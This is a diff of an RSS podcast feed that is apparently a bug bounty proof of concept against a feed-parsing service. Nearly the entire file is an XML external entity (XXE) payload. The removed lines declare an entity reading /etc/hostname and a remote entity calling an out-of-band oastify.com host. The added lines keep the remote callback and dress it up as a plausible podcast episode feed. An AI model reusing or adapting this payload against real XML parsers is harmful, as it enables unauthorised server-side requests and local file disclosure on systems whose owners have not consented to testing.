@@ -1,14 +1,20 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-  <!ENTITY % file SYSTEM "file:///etc/hostname">
-  <!ENTITY % remote SYSTEM "http://5nsaygrlrpsi121a7xapgb805rbizbn0.oastify.com/">
-  %remote;
+<!DOCTYPE rss [
+  <!ENTITY % xxe SYSTEM "http://5nsaygrlrpsi121a7xapgb805rbizbn0.oastify.com/">
+  %xxe;
 ]>
-<rss version="2.0">
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Apple Bug Bounty Test</title>
+    <title>Apple Security Research</title>
+    <link>https://nbvvcghvhjjkgh.github.io/applle-poc/</link>
+    <language>en-us</language>
+    <itunes:author>Youssef</itunes:author>
+    <itunes:summary>Testing XML Parser for OOB Interaction</itunes:summary>
+    <description>Research</description>
     <item>
-      <title>Testing</title>
+      <title>Episode 1</title>
+      <enclosure url="https://nbvvcghvhjjkgh.github.io/applle-poc/test.mp3" length="1024" type="audio/mpeg"/>
+      <guid>12345</guid>
     </item>
   </channel>
 </rss>
